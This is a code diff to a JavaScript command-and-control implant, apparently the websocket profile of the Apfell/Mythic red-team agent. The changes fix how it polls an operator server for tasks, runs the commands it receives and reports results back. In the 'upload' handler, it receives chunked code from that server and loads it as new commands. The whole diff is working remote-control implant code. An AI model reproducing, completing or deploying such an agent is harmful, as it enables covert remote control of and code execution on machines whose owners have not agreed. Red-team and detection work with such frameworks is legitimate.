@@ -68,7 +68,7 @@ class customC2 extends baseC2{
 }
 
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
-const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_REPLACE, INTERVAL_REPLACE);
+const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'websocket', SSL_REPLACE, INTERVAL_REPLACE);
 const connection  = new WebSocket(`${C2.server}`);
 
 function chunkArray(array, size) {
@@ -82,7 +82,7 @@ function chunkArray(array, size) {
 setInterval(function(){
     C2.postResponse();
     if (apfell.apfellid.length !== 0) {
-        let request = {'action':'get_tasking', 'tasking_size': 1, 'delegates':[]};
+        let request = {'action':'get_tasking', 'tasking_size': -1, 'delegates':[]};
         let msg = JSON.stringify(request);
         let final = apfell.apfellid + msg;
         let encfinal = btoa(unescape(encodeURIComponent(final)));
@@ -123,13 +123,14 @@ connection.onmessage = function (e) {
                 const task = message.tasks[index];
 
                 try {
-                    C2.commands[task.command](task);
+                    console.log(Object.values(commands_dict));
+                    commands_dict[task.command](task);
                 } catch (error) {
-                    let response = {'task_id':task.id, 'completed':false, 'status':'error', 'error':'error processing task for id ' + task.id};
+                    let response = {'task_id':task.id, 'completed':false, 'status':'error', 'error':'error processing task for id ' + task.id + '\n' + error.toString()};
                     let outer_response = {'action':'post_response','responses':[response], 'delegates':[]};
                     let msg = btoa(unescape(encodeURIComponent(apfell.apfellid + JSON.stringify(outer_response))));
                     out.push(msg);
-                    console.log("Error executing task: " + err);
+                    console.log("Error executing task: " + error.toString());
                 }
             }
 
@@ -159,7 +160,7 @@ connection.onmessage = function (e) {
 
                             // loop through the chunk array and send each one to apfell
                             for (let j = 0; j < temp.length; j++) {
-                                let response = {
+                                let resp = {
                                     'chunk_num': j+1,
                                     'file_id': response.file_id,
                                     'chunk_data': btoa(unescape(encodeURIComponent(temp[j]))),
@@ -168,7 +169,7 @@ connection.onmessage = function (e) {
 
                                 let outer_response = {
                                     'action':'post_response',
-                                    'responses':[response],
+                                    'responses':[resp],
                                     'delegates':[]
                                 };
 
@@ -208,40 +209,39 @@ connection.onmessage = function (e) {
         }
         case 'upload' : {
             // check for load command responses
-            for (let i = 0; i < message.responses.length; i++) {
-                const response = message.response[i];
-                if (loads.length > 0) {
-                    for (let j = 0; j < loads.length; j++) {
-                        let equal = response.task_id.localeCompare(loads[j].task_id);
-                        if (equal === 0) {
-                            let load = loads[j];
-                            if (response.chunk_num < response.total_chunks) {
-                                let raw = atob(response.chunk_data);
-                                load.data.push(...raw);
-                                loads[j] = load;
-                                let resp = {'action':'upload','chunk_size': 1024000, 'chunk_num':(response.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
-                                let encodedResponse = JSON.stringify(resp);
-                                let final = apfell.apfellid + encodedResponse;
-                                let msg = btoa(unescape(encodeURIComponent(final)));
-                                out.push(msg);
-                            } else if (response.chunk_num === response.total_chunks) {
-                                let raw = atob(response.chunk_data);
-                                load.data.push(...raw);
-                                eval(load.data);
-
-                                let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
-                                let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
-                                let enc = JSON.stringify(outer_response);
-                                let final = apfell.apfellid + enc;
-                                let msg = btoa(unescape(encodeURIComponent(final)));
-                                loads[j] = {};
-                                out.push(msg);
-                            }
+            
+            if (loads.length > 0) {
+                for (let j = 0; j < loads.length; j++) {
+                    let equal = message.file_id.localeCompare(loads[j].file_id);
+                    if (equal === 0) {
+                        let load = loads[j];
+                        if (message.chunk_num < message.total_chunks) {
+                            let raw = atob(message.chunk_data);
+                            load.data.push(...raw);
+                            loads[j] = load;
+                            let resp = {'action':'upload','chunk_size': 1024000, 'chunk_num':(message.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
+                            let encodedResponse = JSON.stringify(resp);
+                            let final = apfell.apfellid + encodedResponse;
+                            let msg = btoa(unescape(encodeURIComponent(final)));
+                            out.push(msg);
+                        } else if (message.chunk_num === message.total_chunks) {
+                            let raw = atob(message.chunk_data);
+                            load.data.push(...raw);
+                            let new_dict = default_load(load.data.join(""));
+                            commands_dict = Object.assign({}, commands_dict, new_dict);
+                            console.log(Object.values(commands_dict));
+                            C2.commands = Object.keys(commands_dict);
+                            let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
+                            let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
+                            let enc = JSON.stringify(outer_response);
+                            let final = apfell.apfellid + enc;
+                            let msg = btoa(unescape(encodeURIComponent(final)));
+                            loads[j] = {};
+                            out.push(msg);
                         }
-                    }
+                    }  
                 }
             }
-
         }
     }
 };
